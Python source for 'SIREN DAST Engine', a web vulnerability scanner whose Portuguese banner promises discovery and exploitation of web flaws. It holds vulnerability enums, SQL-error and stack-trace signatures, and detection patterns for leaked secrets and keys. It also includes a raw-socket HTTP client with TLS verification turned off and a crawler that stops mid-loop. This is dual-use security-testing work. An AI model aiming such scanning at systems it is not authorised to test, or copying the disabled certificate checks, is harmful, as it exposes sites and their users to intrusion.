#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  🎯 SIREN DAST ENGINE — Dynamic Application Security Testing Suite  🎯       ██
██                                                                                ██
██  Motor completo de DAST para descoberta e exploração dinâmica de vulns web.   ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • BFS/DFS Crawling — descoberta de URLs com controle de profundidade       ██
██    • Form Extraction — parsing de formulários, campos hidden, CSRF tokens     ██
██    • Parameter Fuzzing — injeção multi-posição em params, body, headers       ██
██    • Dynamic Payloads — geração context-aware baseada em tipo de parâmetro    ██
██    • Response Analysis — detecção de erros SQL, stack traces, reflexão XSS    ██
██    • Session Management — cookie jar, token refresh, login replay             ██
██    • Authenticated Scanning — crawl com auth, re-auth, access control test    ██
██    • Vulnerability Detection — SQLi, XSS, SSRF, LFI, RCE, IDOR, SSTI       ██
██    • Time-based Detection — comparação de tempo de resposta para blind vulns  ██
██    • Scope Enforcement — robots.txt, sitemap.xml, domínio restrito           ██
██                                                                                ██
██  "SIREN testa cada parâmetro — e encontra o que o WAF esconde."              ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import hashlib
import html
import json
import logging
import math
import os
import re
import socket
import ssl
import threading
import time
import urllib.parse
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Deque, Dict, FrozenSet, List, Optional, Set, Tuple

logger = logging.getLogger("siren.arsenal.dast_engine")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

MAX_CRAWL_DEPTH = 20
MAX_URLS_DEFAULT = 5000
MAX_FORMS_PER_PAGE = 50
MAX_PARAMS_PER_FORM = 100
DEFAULT_TIMEOUT = 15.0
DEFAULT_DELAY = 0.1
BASELINE_SAMPLES = 3
TIME_THRESHOLD_MULTIPLIER = 3.0
MIN_TIME_DIFF_SECONDS = 4.0
MAX_RESPONSE_BODY = 2 * 1024 * 1024  # 2MB
MAX_REDIRECT_FOLLOW = 10
USER_AGENT = "SirenDASTEngine/1.0 (Security Scanner)"
CONTENT_TYPES_CRAWLABLE = frozenset({
    "text/html", "application/xhtml+xml", "text/xml", "application/xml",
})
STATIC_EXTENSIONS = frozenset({
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".svg",
    ".woff", ".woff2", ".ttf", ".eot", ".mp3", ".mp4", ".avi",
    ".mov", ".webm", ".pdf", ".zip", ".tar", ".gz", ".rar",
    ".bmp", ".tiff", ".webp", ".map", ".min.js", ".min.css",
})


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class CrawlStrategy(Enum):
    """URL discovery traversal strategy."""
    BFS = auto()
    DFS = auto()
    HYBRID = auto()


class ScanMode(Enum):
    """DAST scan aggressiveness level."""
    PASSIVE = auto()
    LIGHT = auto()
    NORMAL = auto()
    AGGRESSIVE = auto()
    STEALTH = auto()


class VulnType(Enum):
    """Vulnerability type classification."""
    SQLI = auto()
    SQLI_BLIND_TIME = auto()
    SQLI_BLIND_BOOLEAN = auto()
    SQLI_ERROR = auto()
    XSS_REFLECTED = auto()
    XSS_STORED = auto()
    XSS_DOM = auto()
    SSRF = auto()
    LFI = auto()
    RFI = auto()
    RCE = auto()
    COMMAND_INJECTION = auto()
    SSTI = auto()
    OPEN_REDIRECT = auto()
    IDOR = auto()
    PATH_TRAVERSAL = auto()
    CRLF_INJECTION = auto()
    HEADER_INJECTION = auto()
    XXE = auto()
    CSRF = auto()
    CORS_MISCONFIGURATION = auto()
    SECURITY_MISCONFIGURATION = auto()
    INFO_DISCLOSURE = auto()
    AUTH_BYPASS = auto()
    SESSION_FIXATION = auto()
    BROKEN_ACCESS_CONTROL = auto()
    SENSITIVE_DATA_EXPOSURE = auto()


class Severity(Enum):
    """Vulnerability severity rating."""
    CRITICAL = auto()
    HIGH = auto()
    MEDIUM = auto()
    LOW = auto()
    INFO = auto()


class ParamType(Enum):
    """Detected parameter type."""
    NUMERIC = auto()
    STRING = auto()
    URL = auto()
    EMAIL = auto()
    DATE = auto()
    JSON_VALUE = auto()
    BOOLEAN = auto()
    FILE_PATH = auto()
    BASE64 = auto()
    UUID_VALUE = auto()
    UNKNOWN = auto()


class InjectionPoint(Enum):
    """Where to inject payloads."""
    URL_PARAM = auto()
    POST_BODY = auto()
    HEADER = auto()
    COOKIE = auto()
    PATH_SEGMENT = auto()
    JSON_BODY = auto()
    MULTIPART = auto()


class HttpMethod(Enum):
    """HTTP methods for requests."""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"
    OPTIONS = "OPTIONS"
    HEAD = "HEAD"


class FormEncType(Enum):
    """HTML form encoding types."""
    URL_ENCODED = "application/x-www-form-urlencoded"
    MULTIPART = "multipart/form-data"
    TEXT_PLAIN = "text/plain"


class InputType(Enum):
    """HTML input field types."""
    TEXT = auto()
    PASSWORD = auto()
    HIDDEN = auto()
    EMAIL = auto()
    NUMBER = auto()
    URL = auto()
    TEL = auto()
    SEARCH = auto()
    DATE = auto()
    FILE = auto()
    CHECKBOX = auto()
    RADIO = auto()
    SUBMIT = auto()
    TEXTAREA = auto()
    SELECT = auto()
    UNKNOWN = auto()


class DetectionMethod(Enum):
    """How the vulnerability was detected."""
    ERROR_BASED = auto()
    TIME_BASED = auto()
    CONTENT_DIFF = auto()
    REFLECTION = auto()
    STATUS_CODE = auto()
    HEADER_ANALYSIS = auto()
    BOOLEAN_BASED = auto()
    OUT_OF_BAND = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class Parameter:
    """Represents a single parameter discovered in a request."""
    name: str = ""
    value: str = ""
    param_type: ParamType = ParamType.UNKNOWN
    injection_point: InjectionPoint = InjectionPoint.URL_PARAM
    is_required: bool = False
    is_hidden: bool = False
    max_length: int = -1
    pattern: str = ""
    options: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "value": self.value,
            "param_type": self.param_type.name,
            "injection_point": self.injection_point.name,
            "is_required": self.is_required,
            "is_hidden": self.is_hidden,
            "max_length": self.max_length,
            "pattern": self.pattern,
            "options": self.options,
        }


@dataclass
class FormData:
    """Represents an HTML form extracted from a page."""
    action: str = ""
    method: HttpMethod = HttpMethod.GET
    enctype: FormEncType = FormEncType.URL_ENCODED
    fields: List[Parameter] = field(default_factory=list)
    source_url: str = ""
    has_csrf_token: bool = False
    csrf_token_name: str = ""
    csrf_token_value: str = ""
    form_id: str = ""
    form_name: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "action": self.action,
            "method": self.method.value,
            "enctype": self.enctype.value,
            "fields": [f.to_dict() for f in self.fields],
            "source_url": self.source_url,
            "has_csrf_token": self.has_csrf_token,
            "csrf_token_name": self.csrf_token_name,
            "csrf_token_value": self.csrf_token_value,
            "form_id": self.form_id,
            "form_name": self.form_name,
        }


@dataclass
class Endpoint:
    """Represents a discovered endpoint."""
    url: str = ""
    method: HttpMethod = HttpMethod.GET
    parameters: List[Parameter] = field(default_factory=list)
    forms: List[FormData] = field(default_factory=list)
    content_type: str = ""
    status_code: int = 0
    response_size: int = 0
    response_time: float = 0.0
    headers: Dict[str, str] = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)
    depth: int = 0
    parent_url: str = ""
    requires_auth: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method.value,
            "parameters": [p.to_dict() for p in self.parameters],
            "forms": [f.to_dict() for f in self.forms],
            "content_type": self.content_type,
            "status_code": self.status_code,
            "response_size": self.response_size,
            "response_time": self.response_time,
            "headers": self.headers,
            "discovered_at": self.discovered_at,
            "depth": self.depth,
            "parent_url": self.parent_url,
            "requires_auth": self.requires_auth,
        }


@dataclass
class CrawlResult:
    """Result of a crawling operation."""
    target_url: str = ""
    endpoints: List[Endpoint] = field(default_factory=list)
    forms: List[FormData] = field(default_factory=list)
    urls_visited: Set[str] = field(default_factory=set)
    urls_failed: Set[str] = field(default_factory=set)
    urls_out_of_scope: Set[str] = field(default_factory=set)
    total_time: float = 0.0
    strategy: CrawlStrategy = CrawlStrategy.BFS
    max_depth_reached: int = 0
    robots_disallowed: List[str] = field(default_factory=list)
    sitemap_urls: List[str] = field(default_factory=list)
    started_at: float = field(default_factory=time.time)
    finished_at: float = 0.0
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_url": self.target_url,
            "endpoints": [e.to_dict() for e in self.endpoints],
            "forms": [f.to_dict() for f in self.forms],
            "urls_visited_count": len(self.urls_visited),
            "urls_failed_count": len(self.urls_failed),
            "urls_out_of_scope_count": len(self.urls_out_of_scope),
            "total_time": self.total_time,
            "strategy": self.strategy.name,
            "max_depth_reached": self.max_depth_reached,
            "robots_disallowed": self.robots_disallowed,
            "sitemap_urls": self.sitemap_urls,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "errors": self.errors,
        }


@dataclass
class DASTFinding:
    """A single vulnerability finding from DAST scanning."""
    finding_id: str = ""
    vuln_type: VulnType = VulnType.INFO_DISCLOSURE
    severity: Severity = Severity.INFO
    title: str = ""
    description: str = ""
    url: str = ""
    method: HttpMethod = HttpMethod.GET
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    request_snippet: str = ""
    response_snippet: str = ""
    detection_method: DetectionMethod = DetectionMethod.ERROR_BASED
    confidence: float = 0.0
    cvss_score: float = 0.0
    cwe_id: str = ""
    owasp_category: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    found_at: float = field(default_factory=time.time)
    response_time: float = 0.0
    baseline_time: float = 0.0
    status_code: int = 0
    reproduction_steps: List[str] = field(default_factory=list)
    false_positive_check: bool = False

    def __post_init__(self) -> None:
        if not self.finding_id:
            raw = f"{self.vuln_type.name}:{self.url}:{self.parameter}:{self.payload}"
            self.finding_id = hashlib.sha256(raw.encode()).hexdigest()[:16]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "vuln_type": self.vuln_type.name,
            "severity": self.severity.name,
            "title": self.title,
            "description": self.description,
            "url": self.url,
            "method": self.method.value,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "request_snippet": self.request_snippet,
            "response_snippet": self.response_snippet,
            "detection_method": self.detection_method.name,
            "confidence": self.confidence,
            "cvss_score": self.cvss_score,
            "cwe_id": self.cwe_id,
            "owasp_category": self.owasp_category,
            "remediation": self.remediation,
            "references": self.references,
            "tags": self.tags,
            "found_at": self.found_at,
            "response_time": self.response_time,
            "baseline_time": self.baseline_time,
            "status_code": self.status_code,
            "reproduction_steps": self.reproduction_steps,
            "false_positive_check": self.false_positive_check,
        }


@dataclass
class DASTReport:
    """Complete DAST scan report."""
    report_id: str = ""
    target_url: str = ""
    scan_mode: ScanMode = ScanMode.NORMAL
    findings: List[DASTFinding] = field(default_factory=list)
    crawl_result: Optional[CrawlResult] = None
    total_endpoints: int = 0
    total_forms: int = 0
    total_parameters_fuzzed: int = 0
    total_requests_sent: int = 0
    scan_duration: float = 0.0
    started_at: float = field(default_factory=time.time)
    finished_at: float = 0.0
    severity_counts: Dict[str, int] = field(default_factory=dict)
    vuln_type_counts: Dict[str, int] = field(default_factory=dict)
    scope_config: Dict[str, Any] = field(default_factory=dict)
    scan_config: Dict[str, Any] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)
    authenticated: bool = False

    def __post_init__(self) -> None:
        if not self.report_id:
            raw = f"{self.target_url}:{self.started_at}"
            self.report_id = hashlib.sha256(raw.encode()).hexdigest()[:16]

    def compute_summary(self) -> None:
        """Compute severity and vuln type counts from findings."""
        sev: Dict[str, int] = defaultdict(int)
        vtype: Dict[str, int] = defaultdict(int)
        for f in self.findings:
            sev[f.severity.name] += 1
            vtype[f.vuln_type.name] += 1
        self.severity_counts = dict(sev)
        self.vuln_type_counts = dict(vtype)

    def to_dict(self) -> Dict[str, Any]:
        self.compute_summary()
        return {
            "report_id": self.report_id,
            "target_url": self.target_url,
            "scan_mode": self.scan_mode.name,
            "findings": [f.to_dict() for f in self.findings],
            "crawl_result": self.crawl_result.to_dict() if self.crawl_result else None,
            "total_endpoints": self.total_endpoints,
            "total_forms": self.total_forms,
            "total_parameters_fuzzed": self.total_parameters_fuzzed,
            "total_requests_sent": self.total_requests_sent,
            "scan_duration": self.scan_duration,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "severity_counts": self.severity_counts,
            "vuln_type_counts": self.vuln_type_counts,
            "scope_config": self.scope_config,
            "scan_config": self.scan_config,
            "errors": self.errors,
            "authenticated": self.authenticated,
        }


@dataclass
class HttpResponse:
    """Lightweight HTTP response representation."""
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    url: str = ""
    elapsed: float = 0.0
    redirect_chain: List[str] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "status_code": self.status_code,
            "headers": self.headers,
            "body_length": len(self.body),
            "url": self.url,
            "elapsed": self.elapsed,
            "redirect_chain": self.redirect_chain,
            "error": self.error,
        }


@dataclass
class FuzzResult:
    """Result of a single fuzz attempt."""
    parameter: str = ""
    payload: str = ""
    injection_point: InjectionPoint = InjectionPoint.URL_PARAM
    original_value: str = ""
    response: Optional[HttpResponse] = None
    baseline_response: Optional[HttpResponse] = None
    anomaly_detected: bool = False
    anomaly_type: str = ""
    anomaly_details: str = ""
    vuln_type: Optional[VulnType] = None
    confidence: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "parameter": self.parameter,
            "payload": self.payload,
            "injection_point": self.injection_point.name,
            "original_value": self.original_value,
            "response": self.response.to_dict() if self.response else None,
            "anomaly_detected": self.anomaly_detected,
            "anomaly_type": self.anomaly_type,
            "anomaly_details": self.anomaly_details,
            "vuln_type": self.vuln_type.name if self.vuln_type else None,
            "confidence": self.confidence,
        }


# ════════════════════════════════════════════════════════════════════════════════
# ERROR SIGNATURE DATABASE
# ════════════════════════════════════════════════════════════════════════════════

SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"Warning.*?\Wmysqli?_", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"check the manual that corresponds to your MySQL", "MySQL"),
    (r"com\.mysql\.jdbc", "MySQL"),
    (r"PostgreSQL.*?ERROR", "PostgreSQL"),
    (r"Warning.*?\Wpg_", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"PG::SyntaxError", "PostgreSQL"),
    (r"org\.postgresql\.util\.PSQLException", "PostgreSQL"),
    (r"ERROR:\s+syntax error at or near", "PostgreSQL"),
    (r"Driver.*? SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.*? SQL Server", "MSSQL"),
    (r"\bSQL Server[^&lt;&quot;]+Driver", "MSSQL"),
    (r"Warning.*?\W(mssql|sqlsrv)_", "MSSQL"),
    (r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}", "MSSQL"),
    (r"System\.Data\.SqlClient\.", "MSSQL"),
    (r"(?s)Exception.*?\bRoadhouse\.Cms\.", "MSSQL"),
    (r"Microsoft SQL Native Client error", "MSSQL"),
    (r"com\.microsoft\.sqlserver\.jdbc", "MSSQL"),
    (r"\bORA-\d{5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*?Driver", "Oracle"),
    (r"Warning.*?\W(oci|ora)_", "Oracle"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"java\.sql\.SQLException", "Oracle/Java"),
    (r"SQLite\/JDBCDriver", "SQLite"),
    (r"SQLite\.Exception", "SQLite"),
    (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
    (r"Warning.*?\W(sqlite_|SQLite3::)", "SQLite"),
    (r"\[SQLITE_ERROR\]", "SQLite"),
    (r"SQLITE_MISUSE", "SQLite"),
    (r"unrecognized token:", "SQLite"),
    (r"near \".*?\": syntax error", "SQLite"),
    (r"SQL error.*?message", "Generic SQL"),
    (r"SQL.*?Exception", "Generic SQL"),
    (r"Unclosed quotation mark", "Generic SQL"),
    (r"Incorrect syntax near", "Generic SQL"),
    (r"Unexpected end of command", "Generic SQL"),
    (r"supplied argument is not a valid", "Generic SQL"),
    (r"You have an error in your SQL syntax", "MySQL"),
]

STACK_TRACE_PATTERNS: List[str] = [
    r"Traceback \(most recent call last\)",
    r"at [\w\.$]+\([\w]+\.java:\d+\)",
    r"at [\w\.$]+\.[\w]+\(.*?:\d+\)",
    r"File \".*?\", line \d+",
    r"#\d+ [\w\\/:]+\.php\(\d+\):",
    r"Stack Trace:",
    r"stack_trace",
    r"Exception in thread",
    r"Fatal error:.*?in.*?on line",
    r"Parse error:.*?in.*?on line",
    r"Warning:.*?in.*?on line \d+",
    r"Notice:.*?in.*?on line \d+",
    r"Unhandled Exception:",
    r"Microsoft\.AspNetCore\.Diagnostics",
    r"System\.NullReferenceException",
    r"System\.InvalidOperationException",
    r"at System\.",
    r"Server Error in '/' Application",
]

DEBUG_INFO_PATTERNS: List[str] = [
    r"DOCUMENT_ROOT=",
    r"SERVER_SOFTWARE=",
    r"GATEWAY_INTERFACE=",
    r"phpinfo\(\)",
    r"<title>phpinfo\(\)</title>",
    r"Django Debug Toolbar",
    r"Debugbar",
    r"__debugger__",
    r"werkzeug\.debug",
    r"Flask-DebugToolbar",
    r"DJANGO_SETTINGS_MODULE",
    r"SECRET_KEY\s*=",
    r"DATABASE_URL\s*=",
    r"DB_PASSWORD\s*=",
    r"API_KEY\s*=",
    r"AWS_ACCESS_KEY",
    r"PRIVATE_KEY",
    r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
    r"password\s*[:=]\s*['\"]",
]

XSS_REFLECTION_CONTEXTS: List[Tuple[str, str]] = [
    (r"<script[^>]*>.*?SIREN_CANARY.*?</script>", "script_block"),
    (r"on\w+\s*=\s*['\"].*?SIREN_CANARY", "event_handler"),
    (r"<[^>]+\s+(?:src|href|action)\s*=\s*['\"]?.*?SIREN_CANARY", "attribute_url"),
    (r"<[^>]+\s+\w+\s*=\s*['\"].*?SIREN_CANARY.*?['\"]", "attribute_value"),
    (r"<style[^>]*>.*?SIREN_CANARY.*?</style>", "style_block"),
    (r"<!--.*?SIREN_CANARY.*?-->", "html_comment"),
    (r">.*?SIREN_CANARY.*?<", "text_content"),
]

SENSITIVE_HEADERS: Dict[str, str] = {
    "server": "Server version disclosure",
    "x-powered-by": "Technology stack disclosure",
    "x-aspnet-version": "ASP.NET version disclosure",
    "x-aspnetmvc-version": "ASP.NET MVC version disclosure",
    "x-debug-token": "Debug mode enabled",
    "x-debug-token-link": "Debug mode with link",
}

SECURITY_HEADERS_EXPECTED: Dict[str, str] = {
    "strict-transport-security": "Missing HSTS header",
    "x-content-type-options": "Missing X-Content-Type-Options",
    "x-frame-options": "Missing X-Frame-Options",
    "content-security-policy": "Missing Content-Security-Policy",
    "x-xss-protection": "Missing X-XSS-Protection",
    "referrer-policy": "Missing Referrer-Policy",
    "permissions-policy": "Missing Permissions-Policy",
}

CSRF_TOKEN_NAMES: FrozenSet[str] = frozenset({
    "csrf", "csrf_token", "csrftoken", "csrfmiddlewaretoken",
    "_csrf", "_csrf_token", "xsrf", "xsrf_token", "_xsrf",
    "anti-csrf-token", "authenticity_token", "__requestverificationtoken",
    "token", "_token", "csrf-token", "x-csrf-token",
})


# ════════════════════════════════════════════════════════════════════════════════
# HTTP CLIENT (stdlib only — socket + ssl)
# ════════════════════════════════════════════════════════════════════════════════

class _HttpClient:
    """Minimal HTTP client using stdlib only. No requests/urllib3."""

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._cookies: Dict[str, str] = {}
        self._default_headers: Dict[str, str] = {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }
        self._timeout: float = DEFAULT_TIMEOUT
        self._follow_redirects: bool = True
        self._max_redirects: int = MAX_REDIRECT_FOLLOW
        self._total_requests: int = 0

    def set_timeout(self, timeout: float) -> None:
        self._timeout = timeout

    def set_cookies(self, cookies: Dict[str, str]) -> None:
        with self._lock:
            self._cookies.update(cookies)

    def get_cookies(self) -> Dict[str, str]:
        with self._lock:
            return dict(self._cookies)

    def clear_cookies(self) -> None:
        with self._lock:
            self._cookies.clear()

    def set_header(self, name: str, value: str) -> None:
        with self._lock:
            self._default_headers[name] = value

    def request(
        self,
        method: str,
        url: str,
        body: Optional[str] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> HttpResponse:
        """Send an HTTP request and return response."""
        with self._lock:
            self._total_requests += 1

        parsed = urllib.parse.urlparse(url)
        is_https = parsed.scheme == "https"
        host = parsed.hostname or ""
        port = parsed.port or (443 if is_https else 80)
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        req_headers = dict(self._default_headers)
        req_headers["Host"] = host
        if headers:
            req_headers.update(headers)

        all_cookies = dict(self._cookies)
        if cookies:
            all_cookies.update(cookies)
        if all_cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in all_cookies.items())
            req_headers["Cookie"] = cookie_str

        if body is not None:
            req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            req_headers["Content-Length"] = str(len(body.encode("utf-8")))

        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "".join(f"{k}: {v}\r\n" for k, v in req_headers.items())
        raw_request = request_line + header_lines + "\r\n"
        if body:
            raw_request += body

        response = HttpResponse(url=url)
        start_time = time.time()

        try:
            sock = socket.create_connection((host, port), timeout=self._timeout)
            try:
                if is_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                sock.sendall(raw_request.encode("utf-8", errors="replace"))

                raw_response = b""
                while True:
                    try:
                        chunk = sock.recv(8192)
                        if not chunk:
                            break
                        raw_response += chunk
                        if len(raw_response) > MAX_RESPONSE_BODY:
                            break
                    except socket.timeout:
                        break

                response.elapsed = time.time() - start_time
                response = self._parse_response(raw_response, url, response.elapsed)
                self._extract_cookies(response)

                if self._follow_redirects and response.status_code in (301, 302, 303, 307, 308):
                    response = self._follow_redirect_chain(
                        response, method, body, headers, cookies, 0
                    )
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
        except Exception as exc:
            response.elapsed = time.time() - start_time
            response.error = str(exc)
            logger.debug("HTTP request error for %s: %s", url, exc)

        return response

    def _parse_response(self, raw: bytes, url: str, elapsed: float) -> HttpResponse:
        """Parse raw HTTP response bytes."""
        resp = HttpResponse(url=url, elapsed=elapsed)
        if not raw:
            return resp

        try:
            text = raw.decode("utf-8", errors="replace")
        except Exception:
            try:
                text = raw.decode("latin-1", errors="replace")
            except Exception as exc:
                logger.warning("Failed to decode response from %s: %s", url, exc)
                return resp

        header_end = text.find("\r\n\r\n")
        if header_end == -1:
            header_end = text.find("\n\n")
            if header_end == -1:
                resp.body = text
                return resp

        header_section = text[:header_end]
        body_section = text[header_end:].lstrip("\r\n")

        lines = header_section.split("\r\n") if "\r\n" in header_section else header_section.split("\n")
        if lines:
            status_match = re.match(r"HTTP/[\d.]+\s+(\d{3})", lines[0])
            if status_match:
                resp.status_code = int(status_match.group(1))

        for line in lines[1:]:
            if ":" in line:
                key, _, val = line.partition(":")
                resp.headers[key.strip().lower()] = val.strip()

        resp.body = body_section
        return resp

    def _extract_cookies(self, response: HttpResponse) -> None:
        """Extract Set-Cookie headers into cookie jar."""
        for key in ("set-cookie",):
            val = response.headers.get(key, "")
            if not val:
                continue
            parts = val.split(";")
            if parts:
                cookie_part = parts[0].strip()
                if "=" in cookie_part:
                    cname, _, cval = cookie_part.partition("=")
                    with self._lock:
                        self._cookies[cname.strip()] = cval.strip()

    def _follow_redirect_chain(
        self,
        response: HttpResponse,
        method: str,
        body: Optional[str],
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]],
        depth: int,
    ) -> HttpResponse:
        """Follow redirect chain up to max depth."""
        if depth >= self._max_redirects:
            return response

        location = response.headers.get("location", "")
        if not location:
            return response

        if location.startswith("/"):
            parsed = urllib.parse.urlparse(response.url)
            location = f"{parsed.scheme}://{parsed.netloc}{location}"
        elif not location.startswith("http"):
            base = response.url.rsplit("/", 1)[0]
            location = f"{base}/{location}"

        response.redirect_chain.append(location)

        redirect_method = method
        redirect_body = body
        if response.status_code == 303:
            redirect_method = "GET"
            redirect_body = None

        next_resp = self.request(redirect_method, location, redirect_body, headers, cookies)
        next_resp.redirect_chain = response.redirect_chain + next_resp.redirect_chain

        if next_resp.status_code in (301, 302, 303, 307, 308):
            return self._follow_redirect_chain(
                next_resp, redirect_method, redirect_body, headers, cookies, depth + 1
            )
        return next_resp

    @property
    def total_requests(self) -> int:
        with self._lock:
            return self._total_requests


# ════════════════════════════════════════════════════════════════════════════════
# CRAWLER ENGINE
# ════════════════════════════════════════════════════════════════════════════════

class CrawlerEngine:
    """
    BFS/DFS web crawler with scope enforcement and depth control.

    Discovers URLs, forms, and endpoints within a target scope using
    link extraction from HTML, JavaScript URL parsing, robots.txt
    and sitemap.xml parsing.

    Usage:
        crawler = CrawlerEngine("https://example.com")
        crawler.set_strategy(CrawlStrategy.BFS)
        crawler.set_max_depth(5)
        result = crawler.crawl()
    """

    def __init__(self, target_url: str = "", http_client: Optional[_HttpClient] = None) -> None:
        self._lock = threading.RLock()
        self._target_url: str = target_url
        self._client: _HttpClient = http_client or _HttpClient()
        self._strategy: CrawlStrategy = CrawlStrategy.BFS
        self._max_depth: int = 10
        self._max_urls: int = MAX_URLS_DEFAULT
        self._delay: float = DEFAULT_DELAY
        self._visited: Set[str] = set()
        self._queue: Deque[Tuple[str, int, str]] = deque()
        self._endpoints: List[Endpoint] = []
        self._forms: List[FormData] = []
        self._scope_patterns: List[str] = []
        self._exclude_patterns: List[str] = []
        self._robots_disallowed: List[str] = []
        self._sitemap_urls: List[str] = []
        self._errors: List[str] = []
        self._running: bool = False
        self._respect_robots: bool = True
        self._parse_sitemap: bool = True
        self._extract_js_urls: bool = True
        self._form_extractor: Optional[FormExtractor] = None
        logger.info("CrawlerEngine initialized for target: %s", target_url)

    def set_target(self, url: str) -> None:
        with self._lock:
            self._target_url = url

    def set_strategy(self, strategy: CrawlStrategy) -> None:
        with self._lock:
            self._strategy = strategy

    def set_max_depth(self, depth: int) -> None:
        with self._lock:
            self._max_depth = min(depth, MAX_CRAWL_DEPTH)

    def set_max_urls(self, count: int) -> None:
        with self._lock:
            self._max_urls = count

    def set_delay(self, delay: float) -> None:
        with self._lock:
            self._delay = delay

    def add_scope_pattern(self, pattern: str) -> None:
        with self._lock:
            self._scope_patterns.append(pattern)

    def add_exclude_pattern(self, pattern: str) -> None:
        with self._lock:
            self._exclude_patterns.append(pattern)

    def set_respect_robots(self, respect: bool) -> None:
        with self._lock:
            self._respect_robots = respect

    def set_form_extractor(self, extractor: FormExtractor) -> None:
        with self._lock:
            self._form_extractor = extractor

    def crawl(self) -> CrawlResult:
        """Execute crawl operation and return results."""
        with self._lock:
            self._running = True
            self._visited.clear()
            self._queue.clear()
            self._endpoints.clear()
            self._forms.clear()
            self._errors.clear()

        result = CrawlResult(
            target_url=self._target_url,
            strategy=self._strategy,
            started_at=time.time(),
        )

        if not self._target_url:
            result.errors.append("No target URL set")
            result.finished_at = time.time()
            result.total_time = result.finished_at - result.started_at
            return result

        logger.info("Starting %s crawl of %s (max_depth=%d, max_urls=%d)",
                     self._strategy.name, self._target_url, self._max_depth, self._max_urls)

        if self._respect_robots:
            self._parse_robots_txt()

        if self._parse_sitemap:
            self._parse_sitemap_xml()
            for surl in self._sitemap_urls:
                if self._is_in_scope(surl):
                    self._add_to_queue(surl, 0, self._target_url)

        self._add_to_queue(self._target_url, 0, "")

        max_depth_reached = 0
        while self._running:
            with self._lock:
                if not self._queue or len(self._visited) >= self._max_urls:
                    break

                if self._strategy == CrawlStrategy.DFS:
                    url, depth, parent = self._queue.pop()
                else:
                    url, depth, parent = self._queue.popleft()

            if depth > self._max_depth:
                continue

            normalized = self._normalize_url(url)
            if normalized in self._visited:
                continue

            with self._lock:
                self._visited.add(normalized)

            if not self._is_in_scope(normalized):
                result.urls_out_of_scope.add(normalized)
                continue

            if self._is_disallowed_by_robots(normalized):
                continue

            if self._is_static_resource(normalized):
                continue

            if self._delay > 0:
                time.sleep(self._delay)

            response = self._client.request("GET", normalized)
            if response.error:
                result.urls_failed.add(normalized)
                self._errors.append(f"Error fetching {normalized}: {response.error}")
                continue

            max_depth_reached = max(max_depth_reached, depth)

            endpoint = Endpoint(
                url=normalized,
                method=HttpMethod.GET,
                status_code=response.status_code,
                response_size=len(response.body),
                response_time=response.elapsed,
                headers=dict(response.headers),
                content_type=response.headers.get("content-type", ""),
                depth=depth,
                parent_url=parent,
            )

            params = self._extract_url_params(normalized)
            endpoint.parameters = params

            content_type = response.headers.get("content-type", "").lower()
            is_html = any(ct in content_type for ct in CONTENT_TYPES_CRAWLABLE)

            if is_html and response.body:
                links = self._extract_links(response.body, normalized)
                for link in links:
                    self._add_to_queue(link, depth + 1, normalized)

                if self._extract_js_urls:
                    js_urls = self._extract_js_urls_from_html(response.body, normalized)
                    for js_url in js_urls:
